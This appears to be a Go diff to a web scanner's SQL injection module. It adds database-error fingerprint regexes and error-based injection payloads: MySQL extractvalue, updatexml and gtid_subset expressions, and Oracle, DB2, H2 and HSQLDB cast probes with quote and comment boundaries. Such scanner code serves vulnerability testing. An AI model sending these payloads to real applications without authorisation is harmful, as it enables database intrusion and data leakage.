@@ -43,12 +43,22 @@ var dbmsSignatures = []struct {
 	re   *regexp.Regexp
 }{
 	{"mysql", regexp.MustCompile(`(?i)SQL syntax.*MySQL|MySQLSyntaxError|com\.mysql\.jdbc|valid MySQL result|XPATH syntax error|corresponds to your (MySQL|MariaDB) server`)},
-	{"postgresql", regexp.MustCompile(`(?i)PostgreSQL|pg_query\(\)|PSQLException|Npgsql|invalid input syntax for (?:type )?integer`)},
-	{"mssql", regexp.MustCompile(`(?i)Microsoft SQL Server|Unclosed quotation mark|ODBC SQL Server Driver|System\.Data\.SqlClient|Conversion failed when converting`)},
+	{"postgresql", regexp.MustCompile(`(?i)PostgreSQL|pg_query\(\)|PSQLException|Npgsql|(?:pq:.*)?syntax error at or near|invalid input syntax for (?:type )?integer`)},
+	{"mssql", regexp.MustCompile(`(?i)Microsoft SQL Server|Unclosed quotation mark|ODBC SQL Server Driver|System\.Data\.SqlClient|Incorrect syntax near|Conversion failed when converting`)},
 	{"oracle", regexp.MustCompile(`(?i)ORA-[0-9]{5}|Oracle error|quoted string not properly terminated`)},
 	{"sqlite", regexp.MustCompile(`(?i)SQLite3?::|sqlite3\.OperationalError|SQLITE_ERROR`)},
 	{"db2", regexp.MustCompile(`(?i)DB2 SQL error|SQLCODE`)},
 	{"firebird", regexp.MustCompile(`(?i)Dynamic SQL Error|Firebird`)},
+	{"sybase", regexp.MustCompile(`(?i)Sybase message|SybSQLException`)},
+	{"h2", regexp.MustCompile(`(?i)org\.h2\.jdbc\.JdbcSQL(?:Syntax)?ErrorException|\[4200[01]-\d+\]`)},
+	{"hsqldb", regexp.MustCompile(`(?i)org\.hsqldb\.HsqlException`)},
+	{"sap-hana", regexp.MustCompile(`(?i)\[HDBODBC\]|SAP DBTech JDBC`)},
+	{"informix", regexp.MustCompile(`(?i)Informix|com\.informix\.jdbc`)},
+	{"vertica", regexp.MustCompile(`(?i)\[Vertica\](?:\[VJDBC\])?`)},
+	{"clickhouse", regexp.MustCompile(`(?i)DB::Exception:|ClickHouse exception`)},
+	{"snowflake", regexp.MustCompile(`(?i)SQL compilation error:`)},
+	{"trino", regexp.MustCompile(`(?i)(?:io\.trino|io\.prestosql)\..*Exception`)},
+	{"cockroachdb", regexp.MustCompile(`(?i)CockroachDB`)},
 }
 
 // fingerprintDBMS returns the canonical engine name inferred from a response
@@ -82,9 +92,11 @@ func sqliErrorForcePayloads() []errorForcePayload {
 	// Marker is HEX → reflection-proof.
 	myExpr := fmt.Sprintf("extractvalue(1,concat(0x7e,%s,0x7e,version()))", sqliMarkerHex)
 	myUpd := fmt.Sprintf("updatexml(1,concat(0x7e,%s,0x7e,version()),1)", sqliMarkerHex)
+	myGTID := fmt.Sprintf("gtid_subset(concat(%s,0x7e,version()),1)", sqliMarkerHex)
 	for _, boundary := range []string{"1 AND %s", "1' AND %s-- -", `1" AND %s-- -`, "1) AND %s-- -", "1') AND %s-- -"} {
 		out = append(out, errorForcePayload{value: fmt.Sprintf(boundary, myExpr), dbms: "mysql", asciiMarker: false})
 		out = append(out, errorForcePayload{value: fmt.Sprintf(boundary, myUpd), dbms: "mysql", asciiMarker: false})
+		out = append(out, errorForcePayload{value: fmt.Sprintf(boundary, myGTID), dbms: "mysql", asciiMarker: false})
 	}
 	// PostgreSQL — cast a string to int; the string (our marker) shows up in
 	// "invalid input syntax for integer". Marker is ASCII → needs the error too.
@@ -94,6 +106,18 @@ func sqliErrorForcePayloads() []errorForcePayload {
 	// MSSQL — convert('marker' to int) → "Conversion failed … 'marker' … int".
 	for _, boundary := range []string{"1 AND 1=convert(int,'%s')", "1' AND 1=convert(int,'%s')-- -", "1) AND 1=convert(int,'%s')-- -"} {
 		out = append(out, errorForcePayload{value: fmt.Sprintf(boundary, sqliMarker), dbms: "mssql", asciiMarker: true})
+	}
+	// Oracle / DB2 / Java embedded databases: invalid numeric casts raise a
+	// DBMS-specific conversion error containing the supplied value on common
+	// drivers. Literal marker therefore requires BOTH marker + a fresh DB error.
+	for _, p := range []errorForcePayload{
+		{value: fmt.Sprintf("1 AND 1=TO_NUMBER('%s')", sqliMarker), dbms: "oracle", asciiMarker: true},
+		{value: fmt.Sprintf("1' AND 1=TO_NUMBER('%s')-- -", sqliMarker), dbms: "oracle", asciiMarker: true},
+		{value: fmt.Sprintf("1 AND 1=CAST('%s' AS INTEGER)", sqliMarker), dbms: "db2", asciiMarker: true},
+		{value: fmt.Sprintf("1 AND 1=CAST('%s' AS INT)", sqliMarker), dbms: "h2", asciiMarker: true},
+		{value: fmt.Sprintf("1' AND 1=CAST('%s' AS INT)-- -", sqliMarker), dbms: "hsqldb", asciiMarker: true},
+	} {
+		out = append(out, p)
 	}
 	return out
 }
@@ -330,7 +354,7 @@ func (s *SQLiScanner) secondOrderChecks(ctx context.Context, targetID string, ca
 			return
 		}
 		if kind, ev := s.secondOrderProbe(ctx, w, readURLs, auth); kind != "" {
-			s.store(targetID, "sqli", "high", w.URL, w.Param, kind, ev)
+			s.store(targetID, "sqli", "high", w, kind, ev)
 			found.Add(1)
 			logFn("warn", "sqli", fmt.Sprintf("Second-order SQLi CONFIRMED: %s param=%s", w.URL, w.Param))
 			s.notify(targetID, w.URL, w.Param)
@@ -345,7 +369,8 @@ func (s *SQLiScanner) errorForceProbe(ctx context.Context, ip insertionPoint, au
 		if ctx.Err() != nil {
 			return "", ""
 		}
-		resp, tamper := sqliSendMaybeTamper(ctx, ip, p.value, auth)
+		value := sqliBaseValue(ip) + strings.TrimPrefix(p.value, "1")
+		resp, tamper := sqliSendMaybeTamper(ctx, ip, value, auth)
 		if resp == "" {
 			continue
 		}
@@ -357,8 +382,10 @@ func (s *SQLiScanner) errorForceProbe(ctx context.Context, ip insertionPoint, au
 			dbms = p.dbms
 		}
 		ev := fmt.Sprintf("error-based SQLi PROVEN via forced data extraction: the database evaluated our injected expression and leaked the unique marker %q inside a %s error", sqliMarker, dbms)
-		if ver := extractLeakedVersion(resp); ver != "" {
-			ev += fmt.Sprintf(" (leaked version: %s)", ver)
+		if !p.asciiMarker {
+			if ver := extractLeakedVersion(resp); ver != "" {
+				ev += fmt.Sprintf(" (leaked version: %s)", ver)
+			}
 		}
 		if !p.asciiMarker {
 			ev += " — reflection-proof (marker was sent only as a hex literal, so an ASCII match means the engine decoded and executed it)"
